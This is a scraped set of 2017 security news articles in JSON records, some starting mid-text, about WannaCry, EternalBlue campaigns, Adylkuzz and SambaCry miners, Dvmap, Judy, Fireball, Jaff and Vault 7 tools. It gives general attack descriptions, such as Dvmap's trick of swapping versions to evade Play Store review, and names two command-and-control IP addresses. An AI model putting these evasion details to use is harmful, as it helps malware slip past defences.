regularly, you must be aware of Adylkuzz, a cryptocurrency-mining malware that was using Windows SMB vulnerability at least two weeks before the outbreak of WannaCry ransomware attacks. The Adylkuzz malware was also mining Monero by utilizing the enormous amount of computing resources of the compromised Windows systems. The attackers behind SambaCry-based CPUminer attack have already earned 98 XMR, which worth 5,380 today and this figure is continuously rising with the increase in the number of compromised Linux systems. \"During the first day they gained about 1 XMR (about $55 according to the currency exchange rate for 08.06.2017), but during the last week they gained about 5 XMR per day,\" the researchers say. The maintainers of Samba has already patched the issue in their new Samba versions 4.6.4/4.5.10/4.4.14, and are urging those using a vulnerable version of Samba to install the patch as soon as possible." }

What's interesting? The app was smart enough to fool Google security mechanism by first pretending itself to be a clean app and then temporarily replacing it with a malicious version. Security researchers at Kaspersky Lab discovered a new piece of Android rooting malware that was being distributed as gaming apps on the Google Play Store, hiding behind puzzle game \"colourblock,\" which was being downloaded at least 50,000 times prior to its removal. Dubbed Dvmap, the Android rooting malware disables device's security settings to install another malicious app from a third-party source and also injects malicious code into the device system runtime libraries to gain root access and stay persistent. \"To bypass Google Play Store security checks, the malware creators used a very interesting method: they uploaded a clean app to the store at the end of March, 2017, and would then update it with a malicious version for short period of time,\" the researchers said. \"Usually they would upload a clean version back on Google Play the very same day. They did this at least 5 times between 18 April and 15 May.\" Here's How Dvmap Malware Works Dvmap Trojan works on both 32-bit and 64-bit versions of Android, which once installed, attempts to gain root access on the device and tries to install several modules on the system including a few written in Chinese, along with a malicious app called \"com.qualcmm.timeservices.\" To make sure the malicious module gets executed with system rights, the malware overwrites system's runtime libraries depending on which Android version the device is running. To complete the installation of the above-mentioned malicious app, the Trojan with system rights turns off \"Verify Apps,\" feature and modify system setting to allow app installation from 3rd party app stores. \"Furthermore, it can grant the \"com.qualcmm.timeservices\" app Device Administrator rights without any interaction with the user, just by running commands. It is a very unusual way to get Device Administrator rights,\" the researchers said. This malicious 3rd party app is responsible for connecting the infected device to the attacker's command-and-control server, giving out full control of the device into the hands of attackers. However, the researchers said, they haven't noticed any commands received by the infected Android devices so far, so it's unclear \"what kind of files will be executed, but they could be malicious or advertising files.\" How to Protect Yourself Against Dvmap Malware Researchers are still testing the Dvmap malware, but meanwhile, advise users who installed the puzzle game in question to back up their device's data and perform a full factory data reset in an effort to mitigate the malware. To prevent yourself from being targeted by such apps, always beware of fishy apps, even when downloading from Google Play Store, and try to stick to the trusted brands only. Moreover, always look at the comments left by other users. Always verify app permissions before installing any app and grant only those permissions which have relevant context for the app's purpose. Last but not the least, always keep a good antivirus app on your device that can detect and block such malware before it can infect your device and keep it up-to-date." }
{ "_id" : { "$oid" : "5b35be0f6cefc42b002934de" }, "Category" : "Malware", "Title" : "WannaCry Coding Mistakes Can Help Files Recovery Even After Infection", "Address" : "https://thehackernews.com/2017/06/wannacry-ransomware-unlock-files.html", "Date" : "2017-06-02T05:26:00-11:00", "Article" : "Last month WannaCry ransomware hit more than 300,000 PCs across the world within just 72 hours by using its self-spreading capabilities to infect vulnerable Windows PCs, particularly those using vulnerable versions of the OS, within the same network. But that doesn't mean WannaCry was a high-quality piece of ransomware. Security researchers have recently discovered some programming errors in the code of the WannaCrypt ransomware worm that might allow victims to restore their locked files without paying for any decryption key. After deeply analysing the WannaCry code, security company at Kaspersky Lab found that the ransomware was full of mistakes that could allow some of its victims to restore their files with publicly available free recovery tools or even with simple commands. Anton Ivanov, senior malware analyst at Kaspersky Lab, along with colleagues Fedor Sinitsyn and Orkhan Mamedov, detailed three critical errors made by WannaCry developers that could allow sysadmins to restore potentially lost files. According to researchers, the issues reside in the way WannaCry ransomware deletes original files after encryption. In general, the malware first renames files to change their extension to \".WNCRYT,\" encrypt them and then delete the original files. Recovering Read-only FilesSince it is not at all possible for malicious software to directly encrypt or modify read-only files, WannaCry copies the files and creates their encrypted copies. While the original files remain untouched but are given a 'hidden' attribute, getting the original data back simply requires victims to restore their normal attributes. That wasn't the only mistake within the WannaCry's code, as in some cases, the malware fails to delete the files after encrypting them properly. Recovering Files from the System Drive (i.e. C drive) Researchers have said that files stored on the important folders, like Desktop or Documents folder, can not be recovered without the decryption key because WannaCry has been designed to overwrite original files with random data before removal. However, researchers noticed that other files stored outside of important folders on the system drive could be restored from the temporary folder using a data recovery software. “...the original file will be moved to %TEMP%\\%d.WNCRYT (where %d denotes a numeric value). These files contain the original data and are not overwritten,” researchers said. Recovering Files from the Non-System DrivesResearchers also found that for non-system drives, the WannaCry Ransomware creates a hidden '$RECYCLE' folder and moves original files into this directory after encryption. You can recover those files just by unhiding the '$RECYCLE' folder. Also, due to \"synchronization errors\" in WannaCry's code, in many cases the original files remain in the same directory, making it possible for victims to restore insecurely deleted files using available data recovery software. Programming Blunders: The New Hope for WannaCry Victims These programming errors in the code of WannaCry offer hope to many victims. \"If you were infected with WannaCry ransomware there is a good possibility that you will be able to restore a lot of the files on the affected computer,\" Kaspersky Lab wrote in a blog post published Thursday. \"The code quality is very low.\"\"To restore files, you can use the free utilities available for data recovery.\"The recovery of files infected by WannaCry was first made possible by French researchers Adrien Guinet and Benjamin Delpy, who made a free WannaCry decryption tool that works on Windows XP, Windows 7, Windows Vista, Windows Server 2003 and Server 2008. It's been almost a month since WannaCry epidemic hit computers worldwide, but the hackers behind the self-spread ransomware, which leverages leaked NSA's Windows SMB exploits EternalBlue and DoublePulsar, have not been identified yet. While police and cyber security firms continue to search for answers surrounding the origins of the WannaCry campaign, Dark web intelligence firm Flashpoint recently indicated the perpetrators might be Chinese, based on its linguistic analysis." }

Fireball Malware Infects Nearly 250 Million Computers Worldwide", "Address" : "https://thehackernews.com/2017/06/fireball-computer-virus.html", "Date" : "2017-06-01T06:22:00-11:00", "Article" : "Security researchers have discovered a massive malware campaign that has already infected more than 250 million computers across the world, including Windows and Mac OS. Dubbed Fireball, the malware is an adware package that takes complete control of victim's web browsers and turns them into zombies, potentially allowing attackers to spy on victim's web traffic and potentially steal their data. Check Point researchers, who discovered this massive malware campaign, linked the operation to Rafotech, a Chinese company which claims to offer digital marketing and game apps to 300 million customers. While the company is currently using Fireball for generating revenue by injecting advertisements onto the browsers, the malware can be quickly turned into a massive destroyer to cause a significant cyber security incident worldwide. Fireball comes bundled with other free software programs that you download off of the Internet. Once installed, the malware installs browser plugins to manipulate the victim's web browser configurations to replace their default search engines and home pages with fake search engines (trotux.com). \"It's important to remember that when a user installs freeware, additional malware isn't necessarily dropped at the same time.\" researchers said. \"Furthermore, it is likely that Rafotech is using additional distribution methods, such as spreading freeware under fake names, spam, or even buying installs from threat actors.\" The fake search engine simply redirects the victim's queries to either Yahoo.com or Google.com and includes tracking pixels that collect the victim's information. Far from legitimate purpose, Fireball has the ability to spy on victim's web traffic, execute any malicious code on the infected computers, install plug-ins, and even perform efficient malware dropping, which creates a massive security hole in targeted systems and networks. \"From a technical perspective, Fireball displays great sophistication and quality evasion techniques, including anti-detection capabilities, multi-layer structure, and a flexible C&C– it is not inferior to a typical malware,\" researchers said. At the current, Fireball adware is hijacking users' web traffic to boost its advertisements and gain revenue, but at the same time, the adware has the capability to distribute additional malware. \"Based on our estimated infection rate, in such a scenario, one out of five corporations worldwide will be susceptible to a major breach,\" researchers added. According to researchers, over 250 million computers are infected worldwide, 20 percent of them are corporate networks: 25.3 million infections in India (10.1%) 24.1 million in Brazil (9.6%) 16.1 million in Mexico (6.4%) 13.1 million in Indonesia (5.2%) 5.5 million In US (2.2%) \"How severe is it? Try to imagine a pesticide armed with a nuclear bomb. Yes, it can do the job, but it can also do much more,\" researchers warned. \"Many threat actors would like to have even a fraction of Rafotech's power.\" Warning Signs that Your Computer is Fireball-Infected If the answer to any of the following questions is \"NO,\" that means your computer is infected with Fireball or a similar adware. Open your web browser and check: Did you set your homepage? Are you able to modify your browser's homepage? Are you familiar with your default search engine and can modify that as well? Do you remember installing all of your browser extensions? To remove the adware, just uninstall the respective application from your computer (or use an adware cleaner software) and then restore/reset your browser configurations to default settings. The primary way to prevent such infections is to be very careful when you agree to install. You should always pay attention when installing software, as software installers usually include optional installs. Opt for custom installation and then de-select anything that is unnecessary or unfamiliar." }

However, two weeks ago researchers at Google, Kaspersky Lab, Intezer and Symantec linked WannaCry to ‘Lazarus Group,’ a state-sponsored hacking group believed to work for the North Korean government. Now, new research from dark web intelligence firm Flashpoint indicates the perpetrators may be Chinese, based on its own linguistic analysis. Flashpoint researchers Jon Condra and John Costello analyzed each of WannaCry's localized ransom notes, which is available in 28 languages, for content, accuracy, and style, and discovered that all the notes, except English and Chinese versions (Simplified and Traditional), had been translated via Google Translate. According to the research, Chinese and English versions of the ransomware notes were most likely written by a human. On further analysis, researchers discovered that the English ransom note contains a \"glaring\" grammatical error, which suggests the ransomware author may be a non-native English speaker. “Though the English note appears to be written by someone with a strong command of English, a glaring grammatical error in the note suggest the speaker is non-native or perhaps poorly educated.” And since Google Translate does not work good at translating Chinese to English and English to Chinese, and often produces inaccurate results, the English version could be written for translating the ransom note into other languages. “Comparisons between the Google translated versions of the English ransomware note to the corresponding WannaCry ransom note yielded nearly identical results, producing a 96% or above match.” According to the Flashpoint report, the Chinese ransom notes contain \"substantial content not present in any other version of the note,\" and they are longer than and formatted differently from the English one. The Chinese ransom notes also use proper grammar, punctuation, syntax, and character choice – indicating that the ransomware writer is fluent in the Chinese language. \"A typo in the note, bang zu (幫組) instead of bang zhu (幫助), which means ‘help,' strongly indicates the note was written using a Chinese-language input system rather than being translated from a different version,\" the researchers explain. \"The text uses certain terms that further narrow down a geographic location. One term, libai ( 禮拜 ) for ‘week,’ is more common in southern China, Hong Kong, Taiwan, and Singapore...The other “杀毒软件” for “anti-virus” is more common in the Chinese mainland.\" All these clues made Flashpoint researchers into believing with high confidence that the unknown author or authors of WannaCry ransomware are fluent Chinese speaker and that the Chinese are the source of the English version of the ransom note. However, Flashpoint researchers say it's hard to speculate the nationality of the WannaCry hackers as they may be affiliated to any Asian (China, Hong Kong, Taiwan, or Singapore). WannaCry epidemic hit more than 300,000 PCs in more than 150 countries within just 72 hours, using self-spreading capabilities to infect vulnerable Windows PCs, particularly those using older versions of the operating system. While most of the affected organisations have now returned to normal, law enforcement agencies across the world are on the hunt." }

The security firm Checkpoint on Thursday published a blog post revealing more than 41 Android applications from a Korean company on Google Play Store that make money for its creators by creating fake advertisement clicks from the infected devices. All the malicious apps, developed by Korea-based Kiniwini and published under the moniker ENISTUDIO Corp, contained an adware program, dubbed Judy, that is being used to generate fraudulent clicks to generate revenue from advertisements. Moreover, the researchers also uncovered a few more apps, published by other developers on Play Store, inexplicably containing the same the malware in them. The connection between the two campaigns remains unclear, though researchers believe it is possible that one developer borrowed code from the other, \"knowingly or unknowingly.\" \"It is quite unusual to find an actual organization behind the mobile malware, as most of them are developed by purely malicious actors,\" CheckPoint researchers say. Apps available on play store directly do not contain any malicious code that helped apps to bypass Google Bouncer protections. Once downloaded, the app silently registers user device to a remote command and control server, and in reply, it receives the actual malicious payload containing a JavaScript that starts the actual malicious process. \"The malware opens the URLs using the user agent that imitates a PC browser in a hidden webpage and receives a redirection to another website,\" the researchers say. \"Once the targeted website is launched, the malware uses the JavaScript code to locate and click on banners from the Google ads infrastructure.\" The malicious apps are actual legitimate games, but in the background, they act as a bridge to connect the victim’s device to the adware server. Once the connection is established, the malicious apps spoof user agents to imitate itself as a desktop browser to open a page and generate clicks. Here’s a list of malicious apps developed by Kiniwini and if you have any of these installed on your device, remove it immediately: Fashion Judy: Snow Queen style Animal Judy: Persian cat care Fashion Judy: Pretty rapper Fashion Judy: Teacher style Animal Judy: Dragon care Chef Judy: Halloween Cookies Fashion Judy: Wedding Party Animal Judy: Teddy Bear care Fashion Judy: Bunny Girl Style Fashion Judy: Frozen Princess Chef Judy: Triangular Kimbap Chef Judy: Udong Maker – Cook Fashion Judy: Uniform style Animal Judy: Rabbit care Fashion Judy: Vampire style Animal Judy: Nine-Tailed Fox Chef Judy: Jelly Maker – Cook Chef Judy: Chicken Maker Animal Judy: Sea otter care Animal Judy: Elephant care Judy’s Happy House Chef Judy: Hotdog Maker – Cook Chef Judy: Birthday Food Maker Fashion Judy: Wedding day Fashion Judy: Waitress style Chef Judy: Character Lunch Chef Judy: Picnic Lunch Maker Animal Judy: Rudolph care Judy’s Hospital: Pediatrics Fashion Judy: Country style Animal Judy: Feral Cat care Fashion Judy: Twice Style Fashion Judy: Myth Style Animal Judy: Fennec Fox care Animal Judy: Dog care Fashion Judy: Couple Style Animal Judy: Cat care Fashion Judy: Halloween style Fashion Judy: EXO Style Chef Judy: Dalgona Maker Chef Judy: ServiceStation Food Judy’s Spa Salon At least one of these apps was last updated on Play store in April last year, means the malicious apps were propagating for more than a year.

Just last night, I wanted to watch a French movie, so I searched for English subtitles and downloaded it to my computer. Though that film was excellent, this morning a new research from Checkpoint scared me. I was unaware that a little subtitle file could hand over full control of my computer to hackers, while I was enjoying the movie. Yes, you heard that right. A team of researchers at Check Point has discovered vulnerabilities in four of the most popular media player applications, which can be exploited by hackers to hijack \"any type of device via vulnerabilities; whether it is a PC, a smart TV, or a mobile device\" with malicious codes inserted into the subtitle files. \"We have now discovered malicious subtitles could be created and delivered to millions of devices automatically, bypassing security software and giving the attacker full control of the infected device and the data it holds,\" he added. These four vulnerable media players (mentioned below) have been downloaded more than 220 million times: VLC — Popular VideoLAN Media Player Kodi (XBMC) — Open-Source Media Software Popcorn Time — Software to watch Movies and TV shows instantly Stremio — Video Streaming App for Videos, Movies, TV series and TV channels The vulnerabilities reside in the way various media players process subtitle files and if exploited successfully, could put hundreds of millions of users at risk of getting hacked. As soon as the media player parses those malicious subtitle files before displaying the actual subtitles on your screen, the hackers are granted full control of your computer or Smart TV on which you ran those files. Proof-of-Concept Video In the above video, the researchers demonstrated that how a maliciously crafted subtitle file for a movie added to Popcorn Time media player can hijack a Windows PC. On the right-hand side of the screen, an attacker, running Kali Linux, gained the remote access of the system as soon as the victim added the subtitle file. Since text-based subtitles for movies and TV shows are created by writers and then uploaded to Internet stores, like OpenSubtitles and SubDB, hackers could also craft malicious text files for same TV shows and movies. \"Our researchers were also able to show that by manipulating the website’s ranking algorithm, we could guarantee crafted malicious subtitles would be those automatically downloaded by the media player, allowing a hacker to take complete control over the entire subtitle supply chain, without resorting to a Man in the Middle attack or requiring user interaction,\" CheckPoint researchers said. The researchers believe that similar security vulnerabilities also exist in other streaming media players. How to Protect Your Computer from Hackers? Check Point has already informed the developers of VLC, Kodi, Popcorn Time and Stremio applications about the recently discovered vulnerabilities. \"To allow the developers more time to address the vulnerabilities, we’ve decided not to publish any further technical details at this point,\" the researchers said. All of them have patched the flaws, with Stremio and VLC releasing the patched versions of their software: Stremi 4.0 and VLC 2.2.5 that has been out for two weeks. However, Kodi developer Martijn Kaijser said the official version 17.2 release would arrive later this week, while users could get a fixed version online. A patch for Popcorn Time is also available online. So, users are advised to update their media player as soon as possible." }

Google Play Protect, which is part of the Google Play Store app, uses machine learning and app usage analysis to weed out the dangerous and malicious apps, which have always been albatross around the tech giant's neck. Since Google Play Protect actually comes with the Google Play Store, users do not need to install or activate this security feature separately. Google Play Protect for Android devices consists: App scanning Anti-Theft Measures Browser Protection Play Protect's App Scanning Feature Google Play Protect is an always-on service on devices which said to scan 50 billion apps each day across a billion Android devices to ensure they are safe. Google already has a number of security measures in place to help keep your smartphones safe, including Verify Apps and its Bouncer service, but once apps are uploaded to the Play Store and installed on your device, Google does not have anything in place to monitor the behavior of those apps – something that most malware apps were abusing. Running automatically in the background, Google Play Protect is actually built into devices, which will not only analyse apps before appearing on the Play Store, but also monitor them once installed on the device, including apps that have been installed from third-party stores as well. For this, Google makes use of machine learning algorithms that automatically compares app behavior and distinguishes those acting abnormally, and if encounters any malicious app, it warns you or even disables the app to prevent further harm. Google says it works around the clock to keep up with the latest threats Google says the new machine learning system regularly updates to help Android ecosystem stay one step ahead of any potential threats by always looking out for \"new risks, identifying potentially harmful apps and keeping them off your device or removing them.\" Play Protect's Anti-Theft Measures With the introduction of Google Play Protect, Android Device Manager has been replaced with Find My Device, use to locate lost and misplaced devices. You can use the browser or any other device to remotely call, locate, and lock, your Android device or even erase the data to protect sensitive information remotely. Find My Device is the same old solution, but Google included it into the Google Play Protect program. Play Protect's Browser Protection With Safe Browsing feature in Chrome, Play Protect lets users stay safe while browsing the Internet. Usually, virus, malware and worm land on to your smartphones and computers via malicious web browsers.

The April's data dump was believed to be the most damaging release by the Shadow Brokers till the date, as it publicly leaked lots of Windows hacking tools, including dangerous Windows SMB exploit. After the outbreak of WannaCry last week, security researchers have identified multiple different campaigns exploiting Windows SMB vulnerability (CVE-2017-0143), called Eternalblue, which has already compromised hundreds of thousands of computers worldwide. I have been even confirmed by multiple sources in hacking and intelligence community that there are lots of groups and individuals who are actively exploiting Eternalblue for different motives. Moreover, the Eternalblue SMB exploit (MS17-010) has now been ported to Metasploit, a penetration testing framework that enables researchers as well as hackers to exploit this vulnerability easily. Cybersecurity startup Secdo, an incident response platform, has recently discovered two separate hacking campaigns using the same Eternalblue SMB exploit at least three weeks before the outbreak of WannaCry global ransomware attacks. So, it would not be surprised to find more hacking groups, state-sponsored attackers, financially motivated organized criminal gangs and gray hat hackers exploiting Eternalblue to target large organizations and individuals. The two newly discovered hacking campaigns, one traced back to Russia and another to China, are much more advanced than WannaCry, as sophisticated hackers are leveraging Eternalblue to install backdoors, Botnet malware and exfiltrate user credentials. According to Secdo, these attacks might pose a much bigger risk than WannaCry, because even if companies block WannaCry and patch the SMB Windows flaw, \"a backdoor may persist and compromised credentials may be used to regain access\" to the affected systems. Both campaigns are using a similar attack flow, wherein attackers initially infect the target machine with malware via different attack vectors, then uses Eternalblue to infect other devices in the same network and finally inject a stealthy thread inside legitimate applications, which is then used to achieve persistence by either deploying a backdoor or exfiltrating login credentials. Russian Campaign: Credential-Theft Attacks Secdo discovered that attackers are injecting a malicious thread into the 'lsass.exe' process using Eternalblue. Once infected, the thread began downloading multiple malicious modules and then access SQLite DLL to retrieve users' saved login credentials from Mozilla's FireFox browser. The stolen credentials are then sent to the attacker's command-and-control server via the encrypted Tor network in order to hide the real location of the C&C server. Once sent, a ransomware variant of CRY128, which is a member of the infamous Crypton ransomware family, starts running in the memory and encrypts all the documents on the affected system. According to Secdo, \"at least 5 of the most popular Next Gen AV vendors and Anti-Malware vendors were running on the endpoints and were unable to detect and stop this attack. This is most likely due to the thread only nature of the attack.\" This attack has been traced back to late April, that's three weeks prior to the WannaCry outbreak. The attack originates from Russia-based IP address (77.72.84.11), but that doesn't mean the hackers are Russian. Chinese Campaign: Installs Rootkit and DDoS Botnet This campaign was also seen in late April. Using Eternalblue, a malicious thread is spawned inside of the lsass.exe process, similar to the above-mentioned credential theft attack. But only instead of remaining purely in-memory, the initial payload then connects back to a Chinese command-and-control server on port 998 (117.21.191.69) and downloads a known rootkit backdoor, which is based on ‘Agony rootkit’ to make persistent. Once installed, the payload installs a Chinese Botnet malware, equipped with DDoS attack functionality, on the affected machine. \"These attacks demonstrate that many endpoints may still be compromised despite having installed the latest security patch,\" Secdo concluded. \"We highly recommend using a solution that has the ability to record events at the thread level in order to hunt, mitigate and assess potential damage as soon as possible.\" These malicious campaigns went unnoticed for weeks because unlike WannaCry, the purpose of these attacks was different, holding affected systems for a long time by achieving persistent and stealing credentials to regain access. The recent example is of \"Adylkuzz,\" a recently-discovered stealthy cryptocurrency-mining malware that was also using Windows SMB vulnerability at least two weeks before the outbreak of WannaCry ransomware attacks. These attacks are just the beginning, as attacks like WannaCry have not been completely stopped and given the broad impact of the NSA exploits, hackers and cyber criminals are curiously waiting for the next Shadow Brokers release, which promised to leak more zero-days and exploits from next month. Since the attackers are currently waiting for new zero-days to exploit, there is very little users can do to protect themselves from the upcoming cyber attacks. You can follow some basic security tips that I have mentioned in my previous article about how to disable SMB and prevent your devices from getting hacked." }

In a notice on its website on Tuesday, DocuSign confirmed a breach at one of its email systems when investigating the cause of an increase in DocuSign-impersonating phishing emails. \"A malicious third party had gained temporary access to a separate, non-core system that allows us to communicate service-related announcements to users via email,\" DocuSign said in the announcement. What Happened? An unknown hacker or group of hackers managed to breach one of the electronic signature technology provider's email systems and steal a database containing the email addresses of DocuSign customers. The attackers then used the stolen data to conduct an extensive phishing campaign to target the DocuSign's users over the past week. The phishing email masqueraded as documents sent from another company with the subject line \"Completed *company name* – Accounting Invoice *number* Document Ready for Signature,\" needing a digital signature from the recipient. The emails, sent from domains including dse@docus.com, included a downloadable Microsoft Word document, which when clicked, installs \"macro-enabled-malware\" on the victim's computers. What type of information? The company said only email addresses of its customers had been accessed in the breach. However, DocuSign assured its customers that no names, physical addresses, passwords, social security numbers, credit card information or any other information had been accessed by the attackers. \"No content or any customer documents sent through DocuSign's eSignature system was accessed; and DocuSign's core eSignature service, envelopes and customer documents, and data remain secure,\" the company stressed. How many victims? The number of victims affected by the phishing campaign has not been confirmed, but DocuSign encourages its customers to use the DocuSign Trust Center to help them protect themselves and their employees from phishing attacks. \"Right now we are still acting on the results of our ongoing investigation and cannot comment on those details,\" the company said. What is DocuSign doing? In an attempt to protect its customers, DocuSign has immediately restricted unauthorized access to its system and placed further security controls in place to hardened the security of its systems. The company is also actively working with law enforcement authorities on the investigation of this matter. What should DocuSign customers do? DocuSign recommended its users to delete any email with the following subject line: Completed: [domain name] – Wire transfer for recipient-name Document Ready for Signature Completed: [domain name/email address] – Accounting Invoice [Number] Document Ready for Signature. If you receive any suspicious email, you should forward it to the company's spam address, advised DocuSign. Also, if the email looks like it has come from DocuSign, just do not respond to that email or click on any link provided in the message. Instead, access your documents directly by visiting DocuSign official website, and entering the unique security code provided at the bottom of every legit DocuSign email. The company also informed its users that DocuSign never asks recipients to open any PDF, Office document or ZIP file in an email. Last but not the least, always make sure your antivirus software is up-to-date." }

According to Kafeine, a security researcher at Proofpoint, another group of cyber criminals was using the same EternalBlue exploit, created by the NSA and dumped last month by the Shadow Brokers, to infect hundreds of thousands of computers worldwide with a cryptocurrency mining malware called 'Adylkuzz.' This malicious campaign went unnoticed for weeks because unlike WannaCry, this malware does not install ransomware or notify victims, but instead, it quietly infects unpatched computers with malware that only mine 'Monero,' a Bitcoin-like cryptocurrency. This Malware Saves Computers From Getting Hacked By WannaCry The Researcher believes Adylkuzz malware attack could be larger in scale than WannaCry ransomware attack because it has been designed to block SMB ports of a targeted computer after hijacking it. In other words, Adylkuzz malware infects unpatched computers and then closes SMB ports to prevent them from further infections, which may have indirectly saved hundreds of thousand of computers from getting hacked by WannaCry ransomware as well. Mining cryptocurrencies can be a costly investment as it requires an enormous amount of computing power, but the Adylkuzz cryptocurrency-mining malware makes it easier for cybercriminals by allowing them to utilize computing resources of compromised systems and makes lots and lots of dollars. \"Once infected through use of the EternalBlue exploit, the cryptocurrency miner Adylkuzz is installed and used to generate cybercash for the attackers,\" said Robert Holmes, vice president of products at Proofpoint. One Monero is currently valued at around US$26.77. \"While an individual laptop may generate only a few dollars per week, collectively the network of compromised computers appears to be generating five-figure payouts daily,\" the researchers added. According to Proofpoint, tens of thousands of computers across the world have been infected by the Adylkuzz malware. Despite people's efforts to patch their systems to prevent themselves from the WannaCry menace, Proofpoint believes the Adylkuzz attack is still growing and targeting Windows machines. Last week, in a separate research, GuardiCore researchers uncovered a new botnet malware, dubbed BondNet, that was also infecting Windows machines worldwide, with a combination of techniques, for mining cryptocurrencies — primarily Monero, but also ByteCoin, RieCoin, and ZCash. If this isn't enough, you'll find yourself worry after knowing that the hacking group, Shadow Brokers, who last month leaked the Windows SMB exploit, is back, promising to release more zero-days vulnerabilities and exploits starting from June. So, the best key to keeping yourself safe is that instead of worrying about your devices, just patch them with the latest updates and follow some basic security tips that I have mentioned in my previous article about how to disable SMB and prevent your machines from WannaCry, cryptocurrency mining malware, and other malware." }

Dubbed \"AfterMidnight\" and \"Assassin,\" both malware programs are designed to monitor and report back actions on the infected remote host computer running the Windows operating system and execute malicious actions specified by the CIA. Since March, WikiLeaks has published hundreds of thousands of documents and secret hacking tools that the group claims came from the US Central Intelligence Agency (CIA). This latest batch is the 8th release in the whistleblowing organization's 'Vault 7' series. 'AfterMidnight' Malware Framework According to a statement from WikiLeaks, 'AfterMidnight' allows its operators to dynamically load and execute malicious payload on a target system. The main controller of the malicious payload, disguised as a self-persisting Windows Dynamic-Link Library (DLL) file and executes \"Gremlins\" – small payloads that remain hidden on the target machine by subverting the functionality of targeted software, surveying the target, or providing services for other gremlins. Once installed on a target machine, AfterMidnight uses an HTTPS-based Listening Post (LP) system called \"Octopus\" to check for any scheduled events. If found one, the malware framework downloads and stores all required components before loading all new gremlins in the memory. According to a user guide provided in the latest leak, local storage related to AfterMidnight is encrypted with a key which is not stored on the target machine. A special payload, called \"AlphaGremlin,\" contains a custom script language which even allows operators to schedule custom tasks to be executed on the targeted system. 'Assassin' Malware Framework Assassin is also similar to AfterMidnight and described as \"an automated implant that provides a simple collection platform on remote computers running the Microsoft Windows operating system.\" Once installed on the target computer, this tool runs the implant within a Windows service process, allowing the operators to perform malicious tasks on an infected machine, just like AfterMidnight. Assassin consists of four subsystems: Implant, Builder, Command and Control, and Listening Post. The 'Implant' provides the core logic and functionality of this tool on a target Windows machine, including communications and task execution. It is configured using the 'Builder' and deployed to a target computer via some undefined vector. The 'Builder' configures Implant and 'Deployment Executables' before deployment and \"provides a custom command line interface for setting the Implant configuration before generating the Implant,\" reads the tool's user guide. The 'Command and Control' subsystem acts as an interface between the operator and the Listening Post (LP), while the LP allows the Assassin Implant to communicate with the command and control subsystem through a web server. Last week, WikiLeaks dumped a man-in-the-middle (MitM) attack tool, called Archimedes, allegedly created by the CIA to target computers inside a Local Area Network (LAN). This practice by the US intelligence agencies of holding vulnerabilities, rather than disclosing them to the affected vendors, wreaked havoc across the world in past 3 days, when the WannaCry ransomware hit computers in 150 countries by using an SMB flaw that the NSA discovered and held, but \"The Shadow Brokers\" subsequently leaked it over a month ago. Microsoft Slams NSA For Its Role in 'WannaCry' Attack Even Microsoft President Brad Smith condemned the US intelligence agency’s practice, saying that the \"widespread damage\" caused by WannaCry happened due to the NSA, CIA and other intelligence agencies for holding zero-day security vulnerabilities. \"This is an emerging pattern in 2017. We have seen vulnerabilities stored by the CIA show up on WikiLeaks, and now this vulnerability stolen from the NSA has affected customers around the world,\" Smith said. Since March, the whistleblowing group has published 8 batches of \"Vault 7\" series, which includes the latest and last week leaks, along with the following batches: Year Zero – dumped CIA hacking exploits for popular hardware and software. Weeping Angel – spying tool used by the agency to infiltrate smart TV's, transforming them into covert microphones. Dark Matter – focused on hacking exploits the agency designed to target iPhones and Macs. Marble – revealed the source code of a secret anti-forensic framework, basically an obfuscator or a packer used by the CIA to hide the actual source of its malware. Grasshopper – reveal a framework which allowed the agency to easily create custom malware for breaking into Microsoft's Windows and bypassing antivirus protection. Scribbles – a piece of software allegedly designed to embed 'web beacons' into confidential documents, allowing the spying agency to track insiders and whistleblowers." }

Dubbed \"Jaff,\" the new file-encrypting ransomware is very similar to the infamous Locky ransomware in many ways, but it is demanding 1.79 Bitcoins (approx $3,150), which much higher than Locky, to unlock the encrypted files on an infected computer. According to security researchers at Forcepoint Security Lab, Jaff ransomware, written in C programming language, is being distributed with the help of Necurs botnet that currently controls over 6 million infected computers worldwide. Necurs botnet is sending emails to millions of users with an attached PDF document, which if clicked, opens up an embedded Word document with a malicious macro script to downloads and execute the Jaff ransomware, Malwarebytes says. Jaff is Spreading at the Rate of 5 Million per Hour The malicious email campaign started on Thursday morning at 9 am and had peaked by 1 pm, and its system recorded and blocked more than 13 million emails during that period – that's 5 Million emails per an hour. \"Jaff targets 423 file extensions. It is capable of offline encryption without dependency on a command and control server. Once a file is encrypted, the '.jaff' file extension is appended,\" Forcepoint says. The ransomware then drops a ransom note in every affected folder while the desktop background of the infected computer is also replaced. The ransom note tells victims that their files are encrypted, but doesn’t ask them for any payments; instead, it urges victims to visit a payment portal located on a Tor site, which is accessible via Tor Browser, in order to get decrypt their important files. Once victims install Tor Browser and visit the secret site, there they are then asked for an astounding 1.79 BTC (about $3,150). Separate research conducted by Proofpoint researchers indicated that the Jaff ransomware could be the work of the same cybercriminal gang behind Locky, Dridex, and Bart. The security company said that the Raff ransomware campaign had affected users globally with primarily victim organizations in the United Kingdom and the United States, as well as Ireland, Belgium, Italy, Germany, the Netherlands, France, Mexico and Australia. Massive Ransomware Attack Uses NSA's Windows Exploit In separate news, another massive fast-spreading ransomware campaign is targeting computers at Hospitals, Banks, Telecom and Organisations across the globe today. The ransomware, known as WanaCypt0r or WannaCry, is using NSA's Windows exploit, EternalBlue, which was leaked by Shadow Brokers hacking group over a month ago. Within just hours this cyber attack has infected more than 60,000 computers in 74 countries. How can you Protect yourself from the Jaff Ransomware? To safeguard against such ransomware infection, you should always be suspicious of uninvited documents sent an email and should never click on links inside those documents unless verifying the source. Check if macros are disabled in your Microsoft Office applications. If not, block macros from running in Office files from the Internet. In enterprises, your system admin can set the default setting for macros. To always have a tight grip on all your important files and documents, keep a good backup routine in place that makes their copies to an external storage device that is not always connected to your PC. Moreover, make sure that you run an active anti-virus security suite of tools on your system, and most importantly, always browse the Internet safely." }

